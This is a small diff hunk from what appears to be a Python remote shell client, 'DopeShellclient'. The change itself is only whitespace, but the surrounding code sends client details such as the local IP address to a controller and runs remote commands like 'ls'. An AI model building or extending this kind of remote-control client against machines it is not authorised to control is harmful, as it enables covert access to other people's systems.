@@ -149,7 +149,7 @@ class DopeShellclient:
                     f"Local IP Address: {local_ip}\n"
                 )
                 self.send_data(client_info)
-
+    
             elif command.lower().startswith('ls'):
                 directory = command.split()[1] if len(command.split()) > 1 else '.'
                 try:
